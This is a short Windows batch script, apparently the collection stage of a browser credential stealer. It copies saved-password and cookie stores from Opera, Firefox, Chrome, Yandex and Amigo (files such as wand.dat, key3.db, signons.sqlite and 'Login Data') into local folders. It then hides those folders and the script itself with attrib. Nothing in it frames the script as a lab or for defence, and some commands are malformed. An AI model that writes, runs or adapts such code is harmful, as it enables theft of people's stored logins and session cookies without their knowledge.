@echo
md Mozilla 
md Opera 
md Google 
md Yandex 
md Amigo
CD/D %APPDATA%\Opera\Opera\ 

copy /y wand.dat Opera\ 
copy /y cookies.dat Opera\
cd %AppData%\Mozilla\Firefox\Profiles\*.default
copy /y cookies.sqlite Mozilla
copy /y key3.db Mozilla
copy /y signons.sqlite Mozilla
copy /y %AppData%\Mozilla\Firefox\Profiles\*.default Mozilla

cd %localappdata%\Google\Chrome\User Data\Default
pause
copy /y "%localappdata%\Google\Chrome\User Data\Default\Login Data" "C:\Users\Elewlian\Documents\Embarcadero\Studio\getipandcompname\Win32\Debug\Google"
cd %localappdata%\Yandex\YandexBrowser\User Data\Default
copy /y "%localappdata%\Yandex\YandexBrowser\User Data\Default\Login Data" "Yandex" 
cd %localappdata%\Amigo\User Data\Default
copy /y "%localappdata%\Amigo\User Data\Default\Login Data" "Amigo" 
pause
ATTRIB -R -A -S -H 
attrib +h Mozilla 
attrib +h Opera 
attrib +h Google 
attrib +h Yandex 
attrib +h Amigo 
attrib +h search.bat 
attrib +h new 
